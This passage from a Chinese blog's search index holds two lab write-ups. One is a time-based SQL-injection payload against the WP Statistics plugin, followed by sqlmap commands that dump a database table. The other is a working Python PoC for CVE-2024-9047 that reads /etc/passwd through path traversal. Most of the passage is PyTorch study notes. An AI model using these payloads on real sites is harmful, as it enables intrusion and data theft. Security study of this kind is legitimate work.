time: 00:00:14\n\n访问如下地址\n/wp-admin/admin-ajax.php?action=rest-nonce\n\n只返回一个0\n访问后台/wp-admin\n爆破账号密码得到test/test\n\n这个时候再去访问上边的地址\n\n去国外的wpscan网站查找这个插件的漏洞\nLog in as a user allowed to View WP Statistic and get a nonce via https://example.com/wp-admin/admin-ajax.php?action=rest-nonce, and use it in the URL below, which will be delayed by 5s:http://example.com/wp-json/wp-statistics/v2/metabox?_wpnonce=NONCE&amp;name=words&amp;search_engine=aaa%27%20AND%20(SELECT%205671%20FROM%20(SELECT(SLEEP(5)))Mdgs)--%20HsBR翻译以允许查看WP统计信息的用户身份登录，并通过获取随机数https://example.com/wp-admin/admin-ajax.php?action=rest-nonce，并在下面的URL中使用它，该URL将延迟5s\n\n上边那个地址就是获取随机数的\nhttp://eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox_wpnonce=1b59e86c38&amp;name=words&amp;search_engine=aaa\n\n访问这个\n\n打开抓包，将这个请求的数据包保存为一个txt文件\nGET /wp-json/wp-statistics/v2/metabox?_wpnonce=1b59e86c38&amp;name=words&amp;search_engine=aaa HTTP/1.1Host: eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_6944564f814df9b2fbe11eb13facce02=test%7C1714756444%7CzIsIpot89sHX7l3iB3JS7s3IVkWfnMxqlPnCV2ukwUb%7C7be71dbfa0bb6449f63126909447b7726883186dde21851def2932995d1826ce; wp-settings-time-1=1714583645Upgrade-Insecure-Requests: 1\n\n直接带着cookie跑sqlmap\n#获取库名sqlmap -r test.txt --batch --dbs#获取表名sqlmap -r test.txt --batch -D wordpress --tables#获取字段名sqlmap -r test.txt --batch -D wordpress -T flag --columns#获取字段值sqlmap -r test.txt --batch -D wordpress -T flag -C flag --dump\n\n\n\n\n"},{"url":"/2025/07/18/wordpress%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/cve-2024-9047/CVE-2024-9047/","content":"CVE-2024-9047漏洞描述wordpress的file_upload插件存在路径遍历漏洞，漏洞位于wfu_file_downloader.php文件中，使得未经身份验证的攻击者能够读取或者删除原始意图之外的文件，成功利用这个漏洞要求目标wordpress安装使用php7.4或者更早的版本\n影响版本wordpress file upload &lt;= 4.24.11\n直接贴上利用的poc\nimport requestsfrom urllib.parse import urljoinimport timedef fileuploadcheck(url):    timestamp = str(int(time.time()))    target_url = urljoin(url, \"/wp-content/plugins/wp-file-upload/wfu_file_downloader.php?\"                              \"file=dr0se\"                              \"&amp;dboption_base=cookies\"                              \"&amp;handler=dboption\"                                                 \"&amp;session_legacy=1\"                              \"&amp;dboption_useold=1\"                              \"&amp;wfu_cookie=wp_wpfileupload_dr0se\"                              \"&amp;ticket=dr0se\")    headers = {        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\",        \"Cookie\": f\"wp_wpfileupload_dr0se=1;\"                  f\" wfu_storage_dr0se=/../../../../../etc/passwd;\"                  f\" wfu_download_ticket_dr0se={timestamp}; \"                  f\"wfu_ABSPATH=/;\"    }    try:        response = requests.get(target_url, verify=False, headers=headers, timeout=10)        print(response.text)    except Exception as e:        print(f\"Error while checking {url}: {e}\")if __name__ == \"__main__\":    url = input()    fileuploadcheck(url)\n\n以春秋云境靶场的题目为例，\n\n效果如下，成功实现任意文件读取\n成因分析（日后补上）\n"},{"title":"深度学习-1day","url":"/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-1day/","content":"深度学习和pytorch库简介今天所学到的:\n·了解到深度学习改变在机器学习中使用到的方法\n·pytorch为何适用于深度学习\n今天初识人工智能，这个定义其实是非常模糊的，机器实际上是无法做到真正的独立思考，在现如今发达的时代，模型执行以前这些只有人类才能完成的任务的能力是通过样本得来的，而不是人类通过编码将其变为规则\n深度学习的革命在过去的10年中，被称之为机器学习的一类系统重度依赖于特征工程，特征工程包括提出正确的转换，以便下游算法能够完成任务。例如，为了在手写数字的图像中区分1和0，我们会利用一组过滤器来判断图像上的边缘方向，然后训练一个分类器，在给定边缘方向分布的情况下预测正确的数字。另一个有用的特征可能是封闭圆圈的数量，比如对于数字0和8，特别是对于有2个圈的数字8。\n但是在深度学习中，完成的功能是在原始的数据中找到这样的表征，终点不在于手工制作这些特征，重点在于操作数学实体，去发现特征\n我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。\n为何使用pytorchpytorch使用gpu进行加速计算，速度更快，并且它还提供了支持数学表达式数值优化的工具，用于训练深度学习模型，也可以称之为为科学计算提供优化支持的高性能库，我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。\n其中张量是pytorch中比较重要的一个概念\n用于构建神经网络的PyTorch核心模块位于torch.nn中，它提供了通用的神经网络层和其他架构组件。全连接层、卷积层、激活函数和损失函数都可以在这里找到，这些组件可用于构建和初始化未训练的模型。为了训练模型，我们需要一些额外的东西：模型训练的数据源、一个使模型适应训练数据的优化器，以及一种把模型和数据传输到硬件的方法，该硬件用于执行模型训练所需的计算。\n菜🐕的笔记\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-2day","url":"/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2day/","content":"预训练神经网络网络上有很多是已经经过数据集训练的微型ai，非常的有趣，我们可以把预先训练的神经网络看作是一个接受输入并生成输出的程序，该程序的行为是有神经网络的结构以及它在训练过程中所看到的例子决定的，即期望的输入-输出对，或者期望输出满足的特性，使用现成的模型是快速启动深度学习的一种方法，节省了很多的时间\n一个识别图像主体的预训练网络作为对深度学习的第一次尝试，一个非常先进的深度神经网络是非常有必要的，有许多预先训练过的网络都可以通过源代码库进行访问呢，我本次尝试的是一个在imagenet数据集上的子集训练过的，\n具体来说，图像识别的任务包括获取一个输入图像，并从1000个类别中生成5个白哦前的列表，按可信度排序描述图像的内容\n获取一个预先训练好的网络我所使用的网络是从torchvision中获取的，该项目包含一些表现优异的，关于计算机视觉的神经网络架构，可以方便得访问数据集和其他工具，首先加载并运行两个网络，一个是AlexNet，它是在图像是被方面早期具有突破性得网络之一，然后是残差网络，简称ResNet\nIn[1]from torchvision import models我们可以看看有多少模型print(dir(models))# Out[2]: ['AlexNet',  'DenseNet',  'Inception3',  'ResNet',  'SqueezeNet',  'VGG', ...  'alexnet',  'densenet',  'densenet121', ...  'resnet',  'resnet101',  'resnet152', ...  ] \n\nAlexNet\n按照现在得标准，这是一个相当小得网络，但它非常适合着眼于神经网络，在AlexNet架构中，输入图像从左侧进入并且依次进入5个过滤器，每一个过滤器生成一些输出图像，经过每个过滤器后，图像会被缩小，在过滤器堆栈中，最后一个过滤器产生得图像被排列成一个拥有4096个元素得一维向量，并被分类以产生1000个输出，每个输出对应一个类\n我们可以创建一个AlexNet类得实例，\nalexnet = models.AlexNet()\n\n此时，alexnet是一个可运行得对象，可以像函数一样调用它\nResNet\n现在创建一个网络实例，传递一个参数，指示函数下载resnet101在imagenet数据集上训练好得权重\nresnet = models.resnet101(pretrained=True) \n\n准备运行resnet\n\n再输入图像之前，我们必须要对输入得图像进行预处理，使其大小正确，torchvision模块提供了转换得操作，允许我们快速定义基本预处理函数得管道\nfrom torchvision import transforms preprocess = transforms.Compose([         transforms.Resize(256),         transforms.CenterCrop(224),         transforms.ToTensor(),         transforms.Normalize(             mean=[0.485, 0.456, 0.406],             std=[0.229, 0.224, 0.225]         )]) \n\n这个函数我解释一下，将输入得图像缩放到256x256个像素，围绕中心将图像裁剪为224x224个像素，并将其转化为一个张量，对其rgb分量进行归一化处理，使其具有定义得均值和标准差，张量是一种pytorch多维数组，然后我们就可以加载图像了\nfrom PIL import Image img = Image.open(\"C:\\\\Users\\\\admin\\\\Pictures\\\\Camera Roll\\\\9C4F0A6EAC509071628AC3EF8D36CD8F.jpg\") \n\n通过管道传递图像\nimg_t = preprocess(img) \n\n然后我们可以按照网络期望得方式对输入得张量进行重塑\nimport torch batch_t = torch.unsqueeze(img_t, 0) \n\n现在可以运行模型了\n运行模型为了进行推理，需要将网络置于eval模式\nresnet.eval()\n\n准备进行推理\nout = resnet(batch_t) out \n\n最终产生一个有1000个分数得向量，要查看预测标签得列表，我们需要架子啊一个文本文件，挑选出标签，\n# 如果您想自动下载标签文件import requestsimport os# 检查是否已经有标签文件labels_path = \"e:\\\\code\\\\.idea\\\\pytorch\\\\imagenet_classes.txt\"if not os.path.exists(labels_path):    # 从GitHub下载标签文件    url = \"https://raw.githubusercontent.com/pytorch/hub/master/imagenet_classes.txt\"    response = requests.get(url)    if response.status_code == 200:        with open(labels_path, 'wb') as f:            f.write(response.content)        print(f\"标签文件已下载到 {labels_path}\")        # 读取下载的标签文件        with open(labels_path) as f:            labels = [line.strip() for line in f.readlines()]    else:        print(\"无法下载标签文件，使用内置的部分标签\")else:    # 读取已有的标签文件    with open(labels_path) as f:        labels = [line.strip() for line in f.readlines()]\n\n最后就直接输出结果\n# 获取预测结果_, indices = torch.sort(out, descending=True)percentage = torch.nn.functional.softmax(out, dim=1)[0] * 100print(\"预测的前5个类别:\")for idx in indices[0][:5]:    print(f\"{labels[idx]}: {percentage[idx].item():.2f}%\")_, indices = torch.sort(out, descending=True)[(labels[idx],percentage[idx].item()) for idx in indices[0][:5]]\n\n输出结果如下\nwig: 14.47%stethoscope: 13.13%kimono: 10.52%hair slide: 10.51%academic gown: 5.38%\n\n识别结果如上，还是比较精准得吧\n菜🐕初探神经网络\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-3.day","url":"/2025/04/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-3-day/","content":"从张量基础知识开始学到的\n·张量，是pytorch中的最基本的数据结构\n·张量的索引与运算\n·与NumPy多维数组交互操作\n·将计算移动到GPU以提高速度\n深度学习实际上需要构建一个能将数据从一种转化为另一种表示的系统，系统可以正确的将具有给定形状和颜色的图像映射到标签上\n实际数据转化为浮点数浮点数是网络处理信息的方式，深度学习的神经网络通常在不同阶段学习将数据从一种形式转化为另一种形式，每一个阶段转换的数据可以被认为是一个中间表征序列，这些中间表征都是浮点数的集合\n输入表征（像素值）-------&gt;中间表征（浮点数集合)-------&gt;输出表征(类的概率)\n\n开始将数据转化为浮点数输入之前，必须要对pytorch如何处理和存储数据有深入的理解\n为此，pytorch引入了张量这个而基本的数据结构，在深度学习中张量可以将向量和矩阵推广到任意维度\n张量：多维数组从列表到张量列表的索引的作用是众所周知的，可以用对应的索引来访问相对应位置的数据，这可以用来类比张量中的索引\n构造第一个张量来构造第一个pytorch张量\nimport torcha = torch.ones(3)# 解释：torch.ones(3)创建了一个长度为3的一维张量，其中所有元素都被初始化为1# 所以当我们打印这个张量时，会看到3个1print(f\"这是一个一维张量，包含 {len(a)} 个元素: {a}\")print(a[1])#访问到第二个位置的数据\n\n虽然看起来和列表差不多，但实际上是完全不一样的\n张量的本质张量通常是连续的内存块的视图，这些内存块包含未装箱的数字类型\n假设有一个坐标列表，用它来表示一个几何对象，如一个二维三角形，顶点有三个，我们可以使用一维张量，将x轴坐标储存在偶数索引中，将y轴坐标储存在奇数索引中，而不是在列表中使用数字来 表示坐标，如下所示：\npoints = torch.zeros(6) points[0] = 4.0 points[1] = 1.0 points[2] = 5.0 points[3] = 3.0 points[4] = 2.0 points[5] = 1.0 \n\n也可以像构造函数传递一个列表达到相同的效果，如下图所示：\npoints = torch.tensor([4.0, 1.0, 5.0, 3.0, 2.0, 1.0]) points \n\n尽管将第一个索引单独指向二维点而不是点是可行的，我们可以使用一个二维张量\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) points \n\n可以通过shape属性来查看张量的形状\npoints.shape输出torch.Size([3, 2])\n\n我们就可以知道每一个维度上张量的带线啊哦，我们还可以使用zeros方法和ones方法来初始化张量，以元组的形式来指定大小\npoints = torch.zeros(3, 2) points输出tensor([[0., 0.],\t\t[0., 0.],         \t\t[0., 0.]])\n\n我们可以使用两个索引来访问呢张量中单个元素\npoints[0, 1]输出tensor(1.)#返回第0个点的y坐标，可以理解为二维数组访问元素的方法\n\n索引张量如果我们需要得到张量中除了第一个点之外的所有点，我们九十一使用列表中的切片，如在列表中\nsome_list = list(range(6)) some_list[:] #全部切片some_list[1:4] #第二个到第三个some_list[1:] #第二个以后some_list[:4] #第一个到第三个some_list[::1] #所有元素some_list[1:4:2]#第二个到第三个，步长为2\n\n在张量中，可以使用相同的表示法，在每一个维度都可以使用范围索引\npoints[1:] #第一行后的所有行，包含所有列points[1:, :] #第一行后的所有行，所有列points[1:, 0] #第一行后的所有行，第一列points[None]#增加大小为1的维度\n\n命名张量张量的维度或者是坐标轴通常用来表示诸如像素位置或者是颜色通道的信息，当我们需要将一个张量作为索引的时候，我们需要记住维度的顺序并以此顺序些索引\n假设有一个img_t的三维向量，为了简单，使用虚拟数据，将其转换为灰度图像，\nimg_t = torch.randn(3, 5, 5) # shape [channels, rows, columns] weights = torch.tensor([0.2126, 0.7152, 0.0722])\n\n如果希望代码具有通用性，从表示为具有高度和宽度的二维张量的灰度图像到添加第三个通道的彩色图像，或者从单幅图像到一批图像，假设增加的维度是2：\nbatch_t = torch.randn(2, 3, 5, 5) # shape [batch, channels, rows, columns]\n\nrgb通道有时候在第0维，有时在第一维，我们可以通过从末端开始计数来归纳，总是在从末端开始的第三维中，因此惰性的未加权平均值可以写成下面的形式：\nimg_gray_naive = img_t.mean(-3) batch_gray_naive = batch_t.mean(-3) img_gray_naive.shape, batch_gray_naive.shape 解释- 代码功能 ：- img_t.mean(-3) 和 batch_t.mean(-3) 都是沿着通道维度（第-3维）计算平均值- 这种计算方式被称为\"惰性\"或\"未加权\"灰度转换，因为它简单地对RGB通道取均值- 维度解释 ：- 对于单张图像 img_t (形状为 [C,H,W])：  - -3 表示通道维度（通常是第0维）  - 计算后会得到形状为 [H,W] 的灰度图- 对于批量图像 batch_t (形状为 [N,C,H,W])：  - -3 仍然是通道维度（第1维）  - 计算后会得到形状为 [N,H,W] 的批量灰度图    灰度图：灰度图（Grayscale Image）是指仅包含亮度信息而不包含颜色信息的图像\n\npytorch允许我们对相同形状的张量进行乘法运算，也允许与给定维度中其中一个操作数大小为1的张量进行计算，他还会自动附加大小为1 的前导维度，这个特性别称之为广播\n当创建和使用张量的位置在很远的时候，就很容易出现错误，可以给维度指定一个名称，\nweights_named = torch.tensor([0.2126, 0.7152, 0.0722], names=['channels']) weights_named输出tensor([0.2126, 0.7152, 0.0722], names=('channels',))\n\n当我们已经有一个张量并且想要为其添加名称但不改变现有的名称时，我们可以对其调用refine_names()方法。与索引类似，省略号（…）允许你省略任意数量的维度。使用rename()兄弟方法，还可以覆盖或删除（通过传入None）现有名称：\nimg_named = img_t.refine_names(..., 'channels', 'rows', 'columns') batch_named = batch_t.refine_names(..., 'channels', 'rows', 'columns') print(\"img named:\", img_named.shape, img_named.names) print(\"batch named:\", batch_named.shape, batch_named.names) img named: torch.Size([3, 5, 5]) ('channels', 'rows', 'columns') batch named: torch.Size([2, 3, 5, 5]) (None, 'channels', 'rows', 'columns') \n\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-5day","url":"/2025/04/17/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-5day/","content":"张量的存储视图在底层代码种，张量中的被分配到由torch.storage实例所管理的连续内存块当中，存储区是由数字数据所组成的一维数组，即包含给定类型的数字的连续内存块，如下图所示\n----------------|   张量(引用相同的储存区)   |-----------------|| 4 | 1 | 5 |                              |  4  |  1  || 3 | 2 | 1 |                              |  5  |  3  |从0开始，2行3列                             |  2  |  1  |                                           从0开始，3行2列存储区| 4 | 1 | 5 | 3 | 2 | 1 |.................                    张量是storage实例视图                       \n\n索引储存区在实际中如何使用二位点来索引储存区，可以使用storage()访问给定张量的存储区：\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) points.storage() 输出&lt;bound method Tensor.storage of tensor([[1., 2.],        [2., 3.],        [3., 4.]])&gt;\n\n在底层中，事实上储存的是一个连续的大小为6的连续数组，但是在你打印的时候是会自动进行还原的，我们可以手动索引储存区\na = torch.tensor([[1,2],[2,3],[3,4]],dtype=torch.float32)b = a.storage()print(b[0])输出1.0\n\n不能使用两个索引来索引二维张量的存储区，不管和存储区相关的任何其他张量的维度是多少，他的布局始终都是一维，也可以通过索引直接改变存储区的值\n张量元数据为了在存储区中建立索引，张量依赖于一些明确定义他们的信息，大小，偏移量和步长，大小，在numpy中又被称之为形状是一个元组，表示张量在每一个维度上有多少元素，偏移量就是指存储区中某元素相对第一个元素的索引，步长是指存储区中为了获得下一个元素需要跳过的元素的数量\n\n另一个张量的存储视图我们可以通过提供相应的索引来得到张量中的第二个点，\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point.storage_offset()//返回相对第一个元素的位置的偏移量\n\n函数size和shape属性所包含的信息是一致的\nsecond_point.shapetorch.Size([2]) \n\n步长是一个元素，知识当索引在每一个维度增加1的时候在存储区中必须要跳过的元素的数量，\n例如points的步长为（2，1），意思就是- 第一个数字 2 ：表示在第0维（行）上移动一格时，需要在底层存储中跳过2个元素。- 第二个数字 1 ：表示在第1维（列）上移动一格时，需要跳过1个元素。\n\n使用stride方法就可以获取到步长\n当我们索引一个特定的点，同时看到偏移量增加，表名我们已经提取了一个子张量\nsecond_point = points[1] second_point.size()输出torch.Size([2])second_point.storage_offset()#输出2second_point.stride()输出(1,)\n\n正如预期的那样，子张量的维度少了一维，但仍然能索引到与原始张量相同的存储区，更改子张量也会对原始张量产生影响\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1] second_point[0] = 10.0 points 输出tensor([[ 4., 1.],         \t\t[10., 3.],         \t\t[ 2., 1.]])\n\n可以使用clone方法将这个子张量复制成一个新的张量\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() second_point[0] = 10.0 points 输出tensor([[4., 1.],        \t[5., 3.],         \t[2., 1.]]\n\n无复制转置使用张量points，它在行中有单独的点，在列中有x和y的坐标，然后将其转置，使各个点都在列中，使用t()方法，用于转置一个矩阵\n并且这样转置出来的矩阵和原矩阵共用一个存储区\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) second_point = points[1].clone() print(points.t())输出tensor([[4., 5., 2.],        [1., 3., 1.]])        可以验证这两个张量共享一个存储区id(points.storage()) == id(points_t.storage())输出true\n\n只是在形状和步长上有所不同\n将张量转置之后，如下图所示，我们在步长中改变元素顺序之后，增加的行将沿着存储区跳跃一个单位，就像沿着原张量的列移动一样，转置不会分配新的内存只是创建一个tensor的实例\n\n连续张量在pytorch中一些张量操作只对连续的张量起作用，使用contifuous方法可以将一个不连续的张量转换成一个连续的张量，但是步长和存储发生了改变\npoints = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]]) 、points_t = points.t() #转置points_t 输出tensor([[4., 5., 2.],         \t[1., 3., 1.]])\tpoints_t.storage()输出4.0   1.0   5.0   3.0   2.0   1.0#存储区域points_t.stride()#计算步长输出(1,2)points_t_cont = points_t_cont.contiguous()#转换points_t_cont输出tensor([[4., 5., 2.],         \t\t[1., 3., 1.]])#可以看到已经发生了转置\t\tpoints_t_cont.stride()#计算步长输出(3,1)#可以看到步长已经发生了改变points_t_cont.storage()输出4.0   5.0   2.0   1.0   3.0   1.0#存储区也发生了变化 \n\n将张量存储到Gpupytorch最重要的能够大幅提升运行速度的特性就是可以在gpu上和cpu上同时与逆行，以大规模的提升运算速度\n管理张量的设备属性\npytorch张量还有device的概念，就是张量数据在计算机上的位置\npoints_gpu = torch.tensor([[4.0, 1.0], [5.0, 3.0], [2.0, 1.0]], device='cuda')\n\n可以使用to方法将在cpu上创建的张量复制到gpu上：\npoints_gpu = points.to(device='cuda')\n\n这样将会返回一个新的张量\n序列化张量创建动态的张量是很好的，但是如果里面的数据是有价值的，我们希望将其保存到一个文件当中，可以免去每次运行程序的时候都要从头开始对模型进行训练，可以使用pickle来序列化张量对象，并为存储添加专用的序列化代码，\ntorch.save(points, '../data/p1ch3/ourpoints.t')\n\n加载张量同样可以通过一行代码来实现\npoints = torch.load('../data/p1ch3/ourpoints.t')\n\n用这种方法可以快速的保存张量和使用张量\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-6day","url":"/2025/04/20/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-6day/","content":"使用张量表征真实数据新的知识\n·将真实数据表示为pytorch张量·处理一系列数据类型·从文件加载数据·将数据转换为张量·塑造张量，使他们作为神经网络模型的输入\n\n张量使pytorch中的数据的构建块，神经网络将张量作为输入，并生成张量作为输出，在神经网络内部所有操作其实都是张量之间的操作，神经网络中所有的参数都是张量，要想熟悉pytorch这样的工具，关键是需要了解如何对张量执行操作\n处理图像卷积神经网络的引入彻底的改变了计算机视觉，通过使用成对的输入和期望的输出样本来训练端到端网络，而常见图像加载，要将数据转换为张量所表示\n图像应该别表示为一个排列在具有高度和宽度的规则网格中的标量集合，其中高度和宽度以像素为单位，每一个网格点都有一个标量，将被表示为一个灰度图像，或者每个网格点有多个标量，这时每个标量通常会呈现不同的颜色，或者不同的特性\n添加颜色通道有几种方法可以将颜色编码为数字，最常见的方法是RGB，其中颜色由三个数字定义，分别白哦是红绿蓝的强度，我们可以把颜色通道看作是一个灰度强度图，如下图，其中每一个rgb通道都捕获了光谱的特定部分\n\n加载图像文件图像有几种不同的文件格式，但是在python中由很多的加载图像的方法，从使用imageio模块加载png格式的图像开始\nimport imageioimage_arr = imageio.imread('图片路径')print(image_arr.shape)\n\n此时img是一个具有三个维度的类numpy数组是对象，2个空间维度尺寸–宽度和高度，第三个维度对应红绿蓝色通道，\n改变布局可以使用张量的permute方法是每一个新的维度利用旧的维度得到一个合适的布局，给定输入张量，先布局通道2，然后是0和1，从而得到一个合适的布局\nimg = torch.from_numpy(image_arr)out = img.permute(2,0,1)\n\n解释一下为什么要改变布局，在深度学习和PyTorch中， 改变图像的布局（如 img.permute(2,0,1) ）的主要原因是为了适配神经网络的输入要求 。\n\n原始图片的布局\n\n用 imageio.imread 读取的图片，通常是 (高度, 宽度, 通道) ，即 (H, W, C) ，比如 (256, 256, 3) 。\n\n这种布局是大多数图像处理库（如OpenCV、PIL、imageio）的默认格式。\n\nPyTorch的张量布局要求\n\nPyTorch 的大多数神经网络（如卷积神经网络）要求输入格式为 (通道, 高度, 宽度) ，即 (C, H, W) 。\n\n例如，RGB图片应为 (3, 256, 256) 。\n\n为什么要这样做？\n\n这样做可以让网络高效地批量处理多张图片（batch），并且与PyTorch的底层实现和加速方式兼容。\n\n如果不转换，直接把 (H, W, C) 的图片输入网络，会导致维度不匹配，报错。\n\npermute(2,0,1) 的作用\n\n把原本的 (H, W, C) 变成 (C, H, W) ，即把通道维度移到最前面。\n\n\n改变图像布局是为了让图片数据符合PyTorch神经网络的输入格式要求，保证模型能够正确处理和训练。\n如果你后续要把多张图片组成一个 batch，还需要保证它们的 shape 都是 (C, H, W) ，这样才能直接堆叠成四维张量 (N, C, H, W) （N为图片数量）。\n该操作并没有复制张量数据，而是让out和img使用相同的底层存储，\n到目前位置，我们只描述了单幅图像，创建一个多图像的数据集作为神经网络的输入，沿着第一维度批量存储图像，以获得一个N x C x H x W的张量\n与使用stack构建张量相比，更有效的替代方法是我们可以预先分配一个适当大小的张量，并使用从目录中加载的图像填充他\nbatch_size = 3batch = torch.zeros(batch_size,3,256,dtype=torch.unint8)\n\n这表明我们的批处理将三幅高度256，宽度256的rgb图像组成，现在可以从一个输入目录中加载所有的png图像，并将它们存储在张量中\nimport osdata_dir = '文件目录'filenames = [name for name in os.listdir(data_dir)]for i, filename in enumerate(filename):\timg_arr = imageio.imread(os.path.join(data_dir,filename))\timg_t = torch.from_numpy(img_arr)\timg_t = img_t.permute(2,0,1)\timg_t = img_t[:3]//这里只保留三个通道，即处理单个图片的三个通道\tbatch[i] = img_t\n\n正规化数据神经网络通常使用浮点数张量作为输入，当输入的数据的范围是0-1或-1~1的时候，神经网络表现出最佳的寻来你性能\n需要做的就是将张量转换为浮点数并对像素的值进行归一化处理，将张量强制转化为浮点数并归一化，正规化的一种方式是将像素值除以255\nbatch = batch.float() batch /= 255.0 \n\n正规化的另一种方法是计算输入数据的均值和标准查，并对其进行缩放，使每一个通道的均值为0，标准差为1：\nn_channels = batch.shape[1] for c in range(n_channels):     \tmean = torch.mean(batch[:, c])     \tstd = torch.std(batch[:, c])     \tbatch[:, c] = (batch[:, c] - mean) / std\n\n还可以对输入进行其他的操作，如旋转和缩放啊还有裁剪，这样可能有助于训练，也有可能使任意输入复合网络的输入要求\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-9day","url":"/2025/04/24/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-9day/","content":"处理时间序列处理时间序列，前面用到的葡萄酒的数据集就用不了了，那我们转向另一个数据集，自行车共享系统的数据集，来自华盛顿特区的，目标是将一个平面的二维数据集转换为三维数据集\n\n增加一个时间维度在源数据中，每一行都是一个单独的时间数据，我们需要改变以每一个小时为行的数据组织的方式\n# 先查看CSV文件的前几行来了解格式with open(\"E:\\\\code\\\\staticlist\\\\kaggle_bike_competition_train.csv\", 'r') as f:    for i, line in enumerate(f):        print(f\"行 {i}: {line.strip()}\")  # 打印每行内容，去除首尾空白字符        if i &gt;= 5:  # 只打印前6行            break# 定义一个函数，用于将日期时间字符串转换为小时值def parse_datetime(date_str):    try:        # 日期时间格式为 \"YYYY/M/D H:MM\"        # 分割日期和时间部分        parts = date_str.split()  # 按空格分割，分成日期和时间两部分        if len(parts) &gt;= 2:            # 获取时间部分并提取小时            time_part = parts[1]  # 获取时间部分，如 \"H:MM\"            hour = time_part.split(':')[0]  # 分割冒号，获取小时部分            return float(hour)  # 将小时转换为浮点数        return 0.0  # 如果无法分割，返回默认值0    except Exception as e:        print(f\"解析错误: {date_str}, {e}\")  # 打印错误信息        return 0.0  # 发生异常时返回默认值0# 使用numpy加载CSV数据bike_numpy = np.loadtxt(    \"E:\\\\code\\\\staticlist\\\\kaggle_bike_competition_train.csv\",    dtype=np.float32,  # 设置数据类型为32位浮点数    delimiter=',',  # 设置分隔符为逗号    skiprows=1,  # 跳过第一行（标题行）    usecols=range(12),  # 使用前12列数据    converters={0: parse_datetime}  # 对第一列应用自定义转换函数，将日期时间转换为小时)# 将NumPy数组转换为PyTorch张量bikes = torch.from_numpy(bike_numpy)# 打印加载结果print(\"数据加载成功!\")print(f\"数据形状: {bikes.shape}\")  # 打印数据的形状（行数和列数）print(bikes[:5])  # 打印前5行数据，查看转换结果输出tensor([[ 0.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.8400, 14.3950, 81.0000,          0.0000,  3.0000, 13.0000, 16.0000],        [ 1.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.0200, 13.6350, 80.0000,          0.0000,  8.0000, 32.0000, 40.0000],        [ 2.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.0200, 13.6350, 80.0000,          0.0000,  5.0000, 27.0000, 32.0000],        [ 3.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.8400, 14.3950, 75.0000,          0.0000,  3.0000, 10.0000, 13.0000],        [ 4.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.8400, 14.3950, 75.0000,          0.0000,  0.0000,  1.0000,  